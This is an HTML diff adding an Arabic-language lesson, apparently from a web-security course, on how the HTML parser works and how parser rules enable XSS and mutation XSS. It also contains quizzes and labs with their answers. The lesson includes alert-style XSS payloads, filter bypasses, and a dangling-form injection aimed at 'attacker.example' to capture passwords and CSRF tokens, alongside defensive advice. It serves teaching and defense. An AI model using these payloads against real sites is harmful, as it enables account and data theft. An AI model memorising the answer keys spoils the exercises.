@@ -1,0 +1,290 @@
+      <section class="section" id="s13" data-part="الجزء 1 · HTML" data-pk="html" data-nav="الـ Parser من جوه" data-icon="⚙️" data-keywords="parser tokenizer tree construction state machine tokens insertion mode rawtext rcdata script data plaintext appropriate end tag implied end tags adoption agency foster parenting foreign content svg mathml breakout integration point template innerhtml fragment parsing serialization mxss mutation xss noscript scripting flag parser differential">
+        <div class="section-head">
+          <span class="section-index">13</span>
+          <div>
+            <p class="eyebrow">HTML · الدرس 13 · مستوى متقدم</p>
+            <h2>الـ HTML Parser من جوه: إزاي المتصفح بيقرا الكود فعلًا</h2>
+            <p class="lede">ده أهم درس في الجزء الأول للـ pentester. كل payload XSS، وكل bypass لفلتر أو sanitizer، هو في الحقيقة استغلال لقاعدة في الـ <b>parser</b>: إمتى tag بيبدأ وبيخلص، إيه اللي بيتفسّر كنص وإيه اللي بيتفسّر كـ markup، وإزاي المتصفح «بيصلّح» الكود الغلط. الـ parser ده متوصّف بالتفصيل في <b>HTML Standard</b> — كل المتصفحات الحديثة بتنفّذه بنفس الطريقة، فتقدر تتنبأ بيه بالظبط.</p>
+          </div>
+        </div>
+
+        <h3 class="sub">المرحلتين: Tokenizer ثم Tree builder</h3>
+        <div class="pipeline reveal">
+          <div class="stage"><b>bytes</b><small>من الشبكة أو الملف</small></div><div class="arrow">→</div>
+          <div class="stage"><b>decode</b><small>بالـ charset (UTF-8…) لحروف</small></div><div class="arrow">→</div>
+          <div class="stage"><b>tokenizer</b><small>state machine: حروف → tokens (start tag، end tag، نص، comment، doctype)</small></div><div class="arrow">→</div>
+          <div class="stage"><b>tree builder</b><small>tokens → DOM، بيصلّح الأخطاء حسب «insertion mode»</small></div><div class="arrow">→</div>
+          <div class="stage"><b>DOM</b><small>الشجرة الحية</small></div>
+        </div>
+        <p>الاتنين مش مستقلين: الـ <b>tree builder بيغيّر state الـ tokenizer</b>. مثلًا لما يدخل <code>&lt;textarea&gt;</code> بيقول للـ tokenizer «اللي جاي نص خام لحد <code>&lt;/textarea&gt;</code>». وكمان الـ scripts ممكن تضيف حروف للـ input أثناء الـ parsing (<code>document.write</code>). عشان كده الـ HTML مش ممكن يتـ parse بـ regex.</p>
+
+        <h3 class="sub">الـ Tokenizer: آلة حالات</h3>
+        <p>الـ tokenizer بيقرا حرف حرف، وفي كل لحظة هو في <b>state</b> واحدة (حوالي 80 state في الـ spec). كل state ليها قاعدة: «لو الحرف ده كذا، اعمل كذا وروح للـ state الفلانية». جرّب بنفسك — اختار preset وامشي خطوة خطوة:</p>
+        <div class="widget" data-widget="tokenizer"></div>
+
+        <h3 class="sub">قواعد الـ tokenizer اللي الـ payloads مبنية عليها</h3>
+        <div class="table-wrap reveal"><table class="ref">
+          <thead><tr><th>القاعدة</th><th>مثال</th><th>🎯 الاستغلال</th></tr></thead>
+          <tbody>
+            <tr><td><code>&lt;</code> لازم يتبعها <b>حرف</b> عشان تبقى tag</td><td><code>&lt; img</code> أو <code>&lt;1</code> = نص</td><td>فلتر بيدوّر على <code>&lt;</code> بس بيمنع حاجات بريئة؛ وفلتر بيشيل المسافات ممكن «يعمل» tag</td></tr>
+            <tr><td>اسم الـ tag بيخلص عند مسافة أو <code>/</code> أو <code>&gt;</code></td><td><code>&lt;svg/onload=alert(1)&gt;</code></td><td>فلتر بيدوّر على <code>&lt;svg </code> (بمسافة) بيتعدّى</td></tr>
+            <tr><td>الـ «مسافة» = tab وLF وFF وspace (و<code>/</code> بين الـ attributes)</td><td><code>&lt;img⇥src=x⏎onerror=…&gt;</code></td><td>فلتر بيدوّر على <code>" onerror"</code> بمسافة عادية بيتعدّى</td></tr>
+            <tr><td>القيمة من غير quotes بتخلص عند مسافة أو <code>&gt;</code></td><td><code>&lt;a href=x onmouseover=…&gt;</code></td><td>attribute injection من غير ما تحتاج <code>"</code></td></tr>
+            <tr><td>مش لازم مسافة بعد قيمة بين quotes</td><td><code>&lt;a href="x"onclick="…"&gt;</code></td><td>bypass لفلاتر بتدوّر على <code>\son\w+=</code></td></tr>
+            <tr><td>الـ attribute المكرر بيتشال والأول بيكسب</td><td><code>&lt;a href="/safe" href="javascript:…"&gt;</code></td><td>فلتر بيتشيك آخر واحد (أو كله) بطريقة مختلفة</td></tr>
+            <tr><td>الـ entities بتتفك في الـ attributes</td><td><code>href="&amp;#106;avascript:…"</code></td><td>فلتر بيشوف النص قبل الـ decode</td></tr>
+            <tr><td>الـ comment بيخلص بـ <code>--&gt;</code> <b>أو</b> <code>--!&gt;</code> (و<code>&lt;!--&gt;</code> comment فاضي)</td><td><code>&lt;!-- x --!&gt;&lt;img …&gt;</code></td><td>الخروج من comment لو الفلتر بيشيل <code>--&gt;</code> بس</td></tr>
+            <tr><td><code>&lt;/</code> + حاجة مش حرف = <b>bogus comment</b> لحد <code>&gt;</code></td><td><code>&lt;/ x&gt;</code> و<code>&lt;?php … ?&gt;</code> = comments</td><td>«أكل» جزء من الصفحة جوه comment</td></tr>
+          </tbody>
+        </table></div>
+
+        <h3 class="sub">العناصر «الخاصة»: لما الـ tags تبطل تبقى tags</h3>
+        <p>شوية عناصر الـ tree builder بيحوّل الـ tokenizer معاهم لوضع نص — جواهم مفيش tags خالص، والحاجة الوحيدة اللي بتخرّجك هي الـ <b>end tag المناسب</b> (<code>&lt;/</code> + نفس الاسم + مسافة أو <code>/</code> أو <code>&gt;</code>، والحروف مش فارقة):</p>
+        <div class="table-wrap reveal"><table class="ref">
+          <thead><tr><th>النوع</th><th>العناصر</th><th>tags؟</th><th>entities؟</th></tr></thead>
+          <tbody>
+            <tr><td><b>RAWTEXT</b></td><td><code>style</code>، <code>xmp</code>، <code>iframe</code>، <code>noembed</code>، <code>noframes</code>، و<code>noscript</code> (لو الـ scripting شغّال)</td><td class="t-ok">لأ</td><td class="t-ok">لأ</td></tr>
+            <tr><td><b>RCDATA</b></td><td><code>textarea</code>، <code>title</code></td><td class="t-ok">لأ</td><td class="t-no">أيوه بتتفك</td></tr>
+            <tr><td><b>Script data</b></td><td><code>script</code></td><td class="t-ok">لأ</td><td class="t-ok">لأ</td></tr>
+            <tr><td><b>PLAINTEXT</b></td><td><code>plaintext</code> (قديم)</td><td colspan="2">كل حاجة نص لآخر الملف — مفيش end tag خالص</td></tr>
+          </tbody>
+        </table></div>
+        <html-example file="special-elements.html" auto>
+          <!DOCTYPE html>
+          <html lang="en">
+          <head><meta charset="UTF-8"><title>Special <b>elements</b> &amp; text</title></head>
+          <body>
+            <textarea rows="2"><img src=x onerror=alert(1)> &lt;b&gt;</textarea>
+            <xmp><b>not bold</b> &lt;</xmp>
+            <script>
+              var html = "<b>this is just a string</b>";   // fine: no closing script tag inside
+              console.log("title:", document.title);
+              console.log("textarea value:", document.querySelector("textarea").value);
+            </script>
+          </body>
+          </html>
+        </html-example>
+        <div class="callout pt reveal"><span class="ci">🎯</span><div><strong>الخروج من الـ script بـ <code>&lt;/script&gt;</code></strong><p>الـ HTML parser ميعرفش JavaScript: أول <code>&lt;/script&gt;</code> بيقفل العنصر <b>حتى لو جوه string</b>. فلو السيرفر بيحط input جوه <code>&lt;script&gt;var q = "INPUT";&lt;/script&gt;</code> وبيعمل escape للـ <code>"</code> بس، الـ payload <code>&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt;</code> بيقفل الـ script من برّا خالص (والـ JS اللي اتقطع بيطلع syntax error ملوش أهمية). الدفاع: الـ <code>&lt;</code> لازم تتعمل <code><</code> جوه أي JS بيتولد من السيرفر.</p></div></div>
+
+        <h3 class="sub">الـ Tree builder: المصلّح الأعظم</h3>
+        <p>الـ tree builder عنده «<b>insertion mode</b>» (initial، before html، in head، in body، in table، in select، in template…) بيحدد كل token يتعامل معاه إزاي. وعنده قواعد لكل غلطة. الأشهر:</p>
+        <div class="table-wrap reveal"><table class="ref">
+          <thead><tr><th>القاعدة</th><th>المدخل</th><th>الـ DOM</th></tr></thead>
+          <tbody>
+            <tr><td><b>Implied end tags</b>: عناصر بتقفل اللي قبلها</td><td><code>&lt;p&gt;a&lt;p&gt;b&lt;div&gt;c</code></td><td>3 أخوات: p، p، div</td></tr>
+            <tr><td><b>Adoption agency</b>: formatting متلخبطة</td><td><code>&lt;b&gt;&lt;i&gt;x&lt;/b&gt;y&lt;/i&gt;</code></td><td><code>&lt;b&gt;&lt;i&gt;x&lt;/i&gt;&lt;/b&gt;&lt;i&gt;y&lt;/i&gt;</code></td></tr>
+            <tr><td><b>Foster parenting</b>: محتوى في جدول برا الخلايا</td><td><code>&lt;table&gt;&lt;b&gt;x&lt;/b&gt;&lt;tr&gt;…</code></td><td>الـ <code>b</code> قبل الـ table</td></tr>
+            <tr><td><code>a</code> جوه <code>a</code> ممنوع</td><td><code>&lt;a&gt;1&lt;a&gt;2</code></td><td>الأولاني بيتقفل: لينكين جنب بعض</td></tr>
+            <tr><td>فورم جوه فورم ممنوع</td><td><code>&lt;form&gt;&lt;form&gt;</code></td><td>التانية بتتجاهل تمامًا</td></tr>
+            <tr><td>end tags غريبة</td><td><code>&lt;/br&gt;</code> و<code>&lt;/p&gt;</code> من غير p</td><td><code>&lt;br&gt;</code> و<code>&lt;p&gt;&lt;/p&gt;</code> فاضي</td></tr>
+            <tr><td>عناصر/attributes مكررة للـ <code>html</code>/<code>body</code></td><td><code>&lt;body onload=…&gt;</code> تاني في النص</td><td>الـ attributes الجديدة بتتضاف لـ body الأصلي!</td></tr>
+          </tbody>
+        </table></div>
+        <div class="widget" data-widget="parser"></div>
+        <div class="callout pt reveal"><span class="ci">🎯</span><div><strong>Dangling form و«خطف» عناصر الصفحة</strong><p>قاعدة «الفورم التانية بتتجاهل» معناها: لو حقنت <code>&lt;form action="https://attacker.example/"&gt;</code> (من غير ما تقفلها) <b>قبل</b> فورم حقيقية في الصفحة، الـ <code>&lt;form&gt;</code> الحقيقية هتتجاهل، وكل الخانات اللي جواها (username، password، CSRF token) هتنضم لفورمك. وقاعدة «<code>&lt;body&gt;</code> التاني بيضيف attributes» معناها إن <code>&lt;body onload=…&gt;</code> في نص الصفحة لسه بيشتغل.</p></div></div>
+
+        <h3 class="sub">Foreign content: SVG وMathML قوانين تانية</h3>
+        <p>لما الـ tree builder يدخل <code>&lt;svg&gt;</code> أو <code>&lt;math&gt;</code>، بيبقى في «foreign content»: الـ self-closing بيشتغل، الـ <code>&lt;![CDATA[…]]&gt;</code> مسموح، أسماء زي <code>viewBox</code> و<code>foreignObject</code> بتتظبط، و<b>الأهم</b>: <code>&lt;style&gt;</code> و<code>&lt;title&gt;</code> جوه SVG <b>مش</b> raw text — الـ tags جواهم بتتفسّر! وفيه عناصر HTML لو ظهرت جوه SVG بـ«تهرب» منه وتقفله (زي <code>p</code> و<code>div</code> و<code>img</code> و<code>b</code> و<code>br</code> و<code>table</code>…):</p>
+        <html-example file="foreign.html" auto>
+          <!DOCTYPE html>
+          <html lang="en">
+          <head><meta charset="UTF-8"><title>Foreign content</title></head>
+          <body>
+            <style>/* in HTML: raw text */ <b>not a tag</b></style>
+            <svg width="10" height="10"><style><img src=x alt="I escaped from svg"></style></svg>
+            <script>
+              const img = document.querySelector("img");
+              console.log("img exists:", !!img, "| parent:", img && img.parentNode.localName);
+            </script>
+          </body>
+          </html>
+        </html-example>
+        <p>شوف الـ 🌳 DOM: الـ <code>&lt;img&gt;</code> اللي كان «جوه style جوه svg» طلع <b>ابن لـ body</b> — الـ img عنصر «breakout» فقفل الـ svg وخرج. 🎯 الـ sanitizers اللي بتحلّل HTML بطريقة مختلفة عن المتصفح في الحالات دي (namespace confusion) اتكسرت كتير بسببها.</p>
+        <div class="callout spec reveal"><span class="ci">📜</span><div><strong>Integration points</strong><p>جوه SVG، العناصر <code>foreignObject</code> و<code>desc</code> و<code>title</code> «HTML integration points»: اللي جواهم بيتقري HTML عادي. وفي MathML: <code>mi</code>، <code>mo</code>، <code>mn</code>، <code>ms</code>، <code>mtext</code> (text integration points)، و<code>annotation-xml</code> لو عليه <code>encoding="text/html"</code>. مسارات الدخول والخروج دي بين الـ namespaces هي ملعب الـ mutation XSS.</p></div></div>
+
+        <h3 class="sub">template وinnerHTML: parsing من غير مستند كامل</h3>
+        <ul>
+          <li><code>&lt;template&gt;</code>: المحتوى بيتـ parse لـ <b>DocumentFragment خامل</b> (<code>template.content</code>): الـ scripts مبتشتغلش، والصور مبتتحمّلش، لحد ما حد ينسخه للصفحة.</li>
+          <li><code>el.innerHTML = str</code>: «fragment parsing» — بيتـ parse كأنه جوه العنصر ده (الـ context بيفرق: نفس النص جوه <code>div</code> غير جوه <code>table</code>). وأهم حقيقة أمنية: <b><code>&lt;script&gt;</code> اللي بيدخل بـ innerHTML مبيتنفّذش، لكن <code>&lt;img src=x onerror=…&gt;</code> بيتنفّذ</b>.</li>
+          <li><code>new DOMParser().parseFromString(str, "text/html")</code>: مستند كامل خامل (scripting <b>مقفول</b>) — بتستخدمه sanitizers كتير، ومعاه ملاحظة مهمة تحت.</li>
+        </ul>
+
+        <h3 class="sub">mXSS: لما الـ HTML «يتحوّل» وهو بيتنقل</h3>
+        <p>الـ sanitizer بياخد HTML، يعمله parse، يشيل الخطر، ويعمله <b>serialize</b> لنص تاني. الصفحة بتاخد النص ده وتعمله parse <b>تاني</b> (innerHTML). لو الـ parse التاني طلع شجرة مختلفة عن الأولى، الحاجة اللي اتشافت «آمنة» ممكن تتحوّل لخطيرة — ده <b>mutation XSS</b>. أشهر مصدر: الـ <b>scripting flag</b>. محتوى <code>&lt;noscript&gt;</code> بيتقري HTML لو الـ scripting مقفول (زي DOMParser)، ونص خام لو شغّال (الصفحة الحقيقية):</p>
+        <div class="widget" data-widget="parser" data-input='<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>'></div>
+        <p>فعّل وقفّل «scripting شغّال» وقارن: مع الـ scripting مقفول فيه <code>p</code> عليه title بريء. مع الـ scripting شغّال، الـ <code>&lt;/noscript&gt;</code> اللي جوه الـ title قفلت الـ noscript، والـ <code>img</code> بقى element حقيقي بـ onerror. الحيلة دي بالظبط اتستخدمت في mXSS على <b>Google Search</b> سنة 2019 (اكتشفها الباحث Masato Kinugawa) ضد sanitizer كان بيحلّل بـ scripting مقفول.</p>
+        <div class="callout def reveal"><span class="ci">🛡️</span><div><strong>الدرس الدفاعي</strong><p>(1) ماتعملش sanitize بنفسك بـ regex — استخدم مكتبة متحدّثة زي <b>DOMPurify</b> (بتشتغل على الـ DOM وبتتعامل مع الحالات دي). (2) الأفضل: متعملش serialize ثم parse تاني — حط النتيجة كـ DOM nodes مباشرة. (3) فيه API بيدخل المتصفحات تدريجيًا اسمه <b>Sanitizer API</b> (<code>element.setHTML()</code>) بيعمل parse + sanitize في خطوة واحدة جوه الـ context الصح — اتأكد من دعمه قبل ما تعتمد عليه. (4) وCSP كطبقة إضافية.</p></div></div>
+
+        <div class="exercises">
+          <div class="exercises-head"><h3><span class="bulb">✏️</span> تمارين الدرس 13</h3></div>
+          <quiz id="s13-q1" answer="2">
+            <q>أنهي واحد من دول <b>مش</b> هيتعمل منه element؟</q>
+            <o>`<svg/onload=alert(1)>`</o>
+            <o>`<img	src=x	onerror=alert(1)>` (بـ tabs)</o>
+            <o>`< img src=x onerror=alert(1)>` (مسافة بعد الـ `<`)</o>
+            <o>`<IMG SRC=x ONERROR=alert(1)>`</o>
+            <good>`<` لازم يتبعها حرف ASCII مباشرة. `< img` = نص. الباقي كله tags صحيحة (الـ / والـ tab فواصل، والحروف مش فارقة).</good>
+            <bad>Tag open state: لو اللي بعد `<` مش حرف، الـ `<` بتتعامل كنص عادي. `/` والـ tabs فواصل مقبولة، والـ case مش فارق.</bad>
+          </quiz>
+          <quiz id="s13-q2" answer="0">
+            <q>`<script>var msg = "</script><b>hi</b>";</script>` — إيه اللي هيحصل؟</q>
+            <o>أول `</script>` بيقفل الـ script (الـ JS بيبقى `var msg = "` = syntax error)، والـ `<b>hi</b>` بيتعرض كـ HTML</o>
+            <o>الـ string بيتخزن كامل في `msg`</o>
+            <o>الـ parser بيفهم إن الـ `</script>` جوه string</o>
+            <o>الصفحة كلها بتقف</o>
+            <good>الـ HTML parser مبيفهمش JS. ده سبب إن الـ `<` لازم تتعمل escape (`<`) في أي JS بيتطبع جوه HTML.</good>
+            <bad>Script data state بيدوّر على `</script` بس — ملوش علاقة بالـ quotes بتاعة JavaScript.</bad>
+          </quiz>
+          <quiz id="s13-q3" answer="3">
+            <q>الـ input بتاعك واقع هنا: `<title>Results: INPUT</title>`. أنهي payload هيعمل element؟</q>
+            <o>`<img src=x onerror=alert(1)>`</o>
+            <o>`<script>alert(1)</script>`</o>
+            <o>`&lt;img src=x onerror=alert(1)&gt;`</o>
+            <o>`</title><img src=x onerror=alert(1)>`</o>
+            <good>title = RCDATA: لازم تقفله الأول بـ `</title>`. وده نفس المبدأ لـ textarea وstyle وscript.</good>
+            <bad>جوه title مفيش tags خالص (RCDATA) — كل حاجة نص لحد `</title>`. والـ entities بتتفك لنص بس، مش لـ tags.</bad>
+          </quiz>
+          <quiz id="s13-q4" answer="1">
+            <q>الفلتر بيمسح `-->` من الـ input، والـ input بيتحط جوه `<!-- user: INPUT -->`. إزاي تخرج من الـ comment؟</q>
+            <o>مستحيل من غير `-->`</o>
+            <o>`--!>` بتقفل الـ comment هي كمان</o>
+            <o>`/*` و`*/`</o>
+            <o>`<!--`</o>
+            <good>Comment end bang state: `--!` + `>` = نهاية comment (مع parse error). جرّبها في الـ tokenizer فوق.</good>
+            <bad>الـ spec فيها طريقتين لقفل الـ comment: `-->` و`--!>`. الفلتر نسي التانية.</bad>
+          </quiz>
+          <quiz id="s13-q5" answer="2">
+            <q>`div.innerHTML = '<script>alert(1)</script><img src=x onerror=alert(2)>'`. إيه اللي هيظهر؟</q>
+            <o>alert(1) و alert(2)</o>
+            <o>alert(1) بس</o>
+            <o>alert(2) بس — scripts بتدخل بـ innerHTML مبتتنفّذش، بس event handlers بتشتغل</o>
+            <o>ولا حاجة</o>
+            <good>ده سبب إن `<img onerror>` و`<svg onload>` هما الـ payloads الأساسية في DOM XSS.</good>
+            <bad>الـ spec بتعلّم الـ scripts اللي جاية من innerHTML إنها «already started» فمبتشتغلش. لكن الـ img بيتعمل ويحاول يحمّل والـ onerror بيشتغل.</bad>
+          </quiz>
+          <quiz id="s13-q6" answer="0">
+            <q>`<svg><p>hi</p></svg>` — الـ `p` هيبقى فين في الـ DOM؟</q>
+            <o>برا الـ svg (ابن لـ body) — الـ p عنصر breakout بيقفل الـ foreign content</o>
+            <o>جوه الـ svg كعنصر SVG اسمه p</o>
+            <o>هيتشال</o>
+            <o>جوه الـ svg كعنصر HTML</o>
+            <good>عناصر زي p وdiv وimg وb وbr وtable بتخرج من SVG/MathML. الـ namespaces confusion دي أساس mXSS.</good>
+            <bad>في foreign content، عناصر HTML معينة (p، div، img، br…) بتعمل pop لكل عناصر SVG وترجع للـ HTML.</bad>
+          </quiz>
+          <quiz id="s13-q7" answer="3">
+            <q>sanitizer بيحلّل الـ input بـ `DOMParser` (scripting مقفول)، وبعدين الصفحة بتحط الناتج بـ `innerHTML`. ليه `<noscript>` خطر هنا؟</q>
+            <o>مش خطر، الـ noscript مبيتعرضش</o>
+            <o>الـ noscript بيشغّل scripts</o>
+            <o>الـ DOMParser مبيدعمش noscript</o>
+            <o>محتوى noscript بيتقري HTML في الـ sanitizer ونص خام في الصفحة — فالـ `</noscript>` المستخبية في attribute بتقفله في الصفحة بس، وعنصر خطير يطلع</o>
+            <good>ده parser differential من الـ scripting flag. الحل: sanitizer بيشتغل بنفس ظروف الـ parsing النهائية، ومن غير serialize/re-parse.</good>
+            <bad>المشكلة إن نفس النص بيتقري بطريقتين حسب الـ scripting flag. الـ sanitizer شاف attribute بريء، والصفحة شافت img بـ onerror.</bad>
+          </quiz>
+
+          <html-lab id="s13-lab1" title="3 فقرات من غير ولا `</p>`" level="1">
+            <desc><p>اكتب HTML ينتج في الـ body <b>3 عناصر <code>p</code> أخوات</b> (ولاد مباشرين لـ body) نصوصهم بالترتيب: <b>one</b> و<b>two</b> و<b>three</b> — <b>من غير ما تكتب ولا <code>&lt;/p&gt;</code></b>. استغل الـ implied end tags.</p></desc>
+            <starter>
+              <!DOCTYPE html>
+              <html lang="en">
+              <head><meta charset="UTF-8"><title>Implied</title></head>
+              <body>
+                <p>one</p>
+              </body>
+              </html>
+            </starter>
+            <solution>
+              <!DOCTYPE html>
+              <html lang="en">
+              <head><meta charset="UTF-8"><title>Implied</title></head>
+              <body>
+                <p>one
+                <p>two
+                <p>three
+              </body>
+              </html>
+            </solution>
+            <test label="مفيش ولا `&lt;/p&gt;` في الكود">!/<\/p\s*>/i.test(S)</test>
+            <test label="3 `p` ولاد مباشرين لـ body">count("body > p") === 3</test>
+            <test label="النصوص: one, two, three بالترتيب">$$("body > p").map(p => p.textContent.trim()).join(",") === "one,two,three"</test>
+            <hint>الـ `<p>` الجديدة بتقفل اللي قبلها أوتوماتيك.</hint>
+          </html-lab>
+
+          <html-lab id="s13-lab2" title="اكتب جوه الجدول… واطلع قبله" level="2">
+            <desc><p>اكتب كود فيه <code>&lt;p&gt;</code> مكتوب <b>جوه</b> <code>&lt;table&gt;</code> في الـ source (بعد <code>&lt;table&gt;</code> وقبل <code>&lt;/table&gt;</code>)، بس في الـ DOM يطلع <b>قبل</b> الجدول — والجدول نفسه فيه صف وخلية بنص <b>cell</b>.</p></desc>
+            <starter>
+              <!DOCTYPE html>
+              <html lang="en">
+              <head><meta charset="UTF-8"><title>Foster</title></head>
+              <body>
+                <table>
+                  <tr><td>cell</td></tr>
+                </table>
+              </body>
+              </html>
+            </starter>
+            <solution>
+              <!DOCTYPE html>
+              <html lang="en">
+              <head><meta charset="UTF-8"><title>Foster</title></head>
+              <body>
+                <table>
+                  <p>I was written inside the table</p>
+                  <tr><td>cell</td></tr>
+                </table>
+              </body>
+              </html>
+            </solution>
+            <test label="في الـ source: `&lt;p` بين `&lt;table` و`&lt;/table&gt;`">(() => { const a = S.indexOf("<table"), b = S.indexOf("<p"), c = S.indexOf("</table"); return a >= 0 && b > a && c > b; })()</test>
+            <test label="في الـ DOM: الـ p قبل الـ table مباشرة">has("table") && $("table").previousElementSibling && $("table").previousElementSibling.localName === "p"</test>
+            <test label="مفيش p جوه الجدول">!has("table p")</test>
+            <test label="الجدول فيه خلية نصها cell">$$("td").some(td => td.textContent.trim() === "cell")</test>
+          </html-lab>
+
+          <html-lab id="s13-lab3" title="اهرب من الـ SVG" level="3">
+            <desc><p>اكتب <code>&lt;img&gt;</code> مكتوب في الـ source <b>جوه</b> <code>&lt;svg&gt;</code> (قبل أي <code>&lt;/svg&gt;</code>)، بس في الـ DOM يطلع <b>برا</b> الـ svg خالص. والـ img عليه <code>alt="escaped"</code>. (من غير <code>foreignObject</code>.)</p></desc>
+            <starter>
+              <!DOCTYPE html>
+              <html lang="en">
+              <head><meta charset="UTF-8"><title>Breakout</title></head>
+              <body>
+                <svg width="20" height="20"><circle cx="10" cy="10" r="8"/></svg>
+              </body>
+              </html>
+            </starter>
+            <solution>
+              <!DOCTYPE html>
+              <html lang="en">
+              <head><meta charset="UTF-8"><title>Breakout</title></head>
+              <body>
+                <svg width="20" height="20"><circle cx="10" cy="10" r="8"/><style><img alt="escaped"></style></svg>
+              </body>
+              </html>
+            </solution>
+            <test label="في الـ source: `&lt;img` بعد `&lt;svg` وقبل أي `&lt;/svg`">(() => { const a = S.indexOf("<svg"), b = S.indexOf("<img"), c = S.indexOf("</svg"); return a >= 0 && b > a && (c < 0 || c > b); })()</test>
+            <test label="الـ img موجود في الـ DOM وعليه alt=escaped">has('img[alt="escaped"]')</test>
+            <test label="الـ img مش جوه أي svg">!has("svg img")</test>
+            <test label="من غير foreignObject">!/foreignobject/i.test(S)</test>
+            <hint>`img` عنصر breakout: أول ما يظهر جوه SVG (حتى جوه `<style>` بتاع SVG) بيقفل الـ svg ويخرج.</hint>
+          </html-lab>
+
+          <task id="s13-t1" title="كام attribute؟" level="2" answer="3" norm="int">
+            <desc><p>بعد الـ tokenizing، الـ <code>img</code> ده هيبقى عليه <b>كام attribute</b>؟</p></desc>
+            <listing lang="html" file="img.html">
+              <img src=x SRC=y alt=a/b onerror=alert(1) ALT="c">
+            </listing>
+            <hint>الأسماء بتتحول small، والمكرر بيتشال (الأول بيكسب). والـ `/` جوه قيمة من غير quotes؟</hint>
+            <explain>3: `src=x` و`alt=a/b` و`onerror=alert(1)`. `SRC` = `src` مكرر فاتشال، و`ALT` = `alt` مكرر فاتشال. والـ `/` جوه قيمة من غير quotes جزء من القيمة (القيمة بتخلص بالمسافة بس). اتأكد بالـ tokenizer فوق.</explain>
+          </task>
+          <task id="s13-t2" title="أقصر قفلة" level="2" answer="--!>" norm="exact">
+            <desc><p>الـ input بيتحط جوه <code>&lt;!-- comment: INPUT --&gt;</code> والفلتر بيمسح أي <code>--&gt;</code>. اكتب <b>أقصر</b> تسلسل حروف يقفل الـ comment (اكتبه بالظبط).</p></desc>
+            <explain>`--!>` (4 حروف). بعدها أي HTML هيتقري markup: `--!><img src=x onerror=alert(1)>`. الإصلاح: الـ encoding الصح (`<` و`>` → entities) بدل blocklist.</explain>
+          </task>
+          <task id="s13-t3" title="الـ differential" level="3" answer="img">
+            <desc><p>في صفحة حقيقية (الـ scripting شغّال)، بعد ما الـ HTML ده يتحط بـ innerHTML جوه div: إيه <b>العنصر</b> اللي عليه <code>onerror</code> واتعمل فعلًا؟</p></desc>
+            <listing lang="html" file="sanitized-output.html">
+              <noscript><p title="</noscript><img src=x onerror=alert(document.domain)>"></noscript>
+            </listing>
+            <explain>`img`. مع الـ scripting شغّال، `noscript` = RAWTEXT: أول `</noscript>` (اللي «جوه» الـ title من وجهة نظر sanitizer شغّال بـ scripting مقفول) بتقفله، وبعدها `<img …>` بيتقري tag حقيقي. جرّب نفس النص في الـ Parser Playground بالوضعين.</explain>
+          </task>
+        </div>
+      </section>
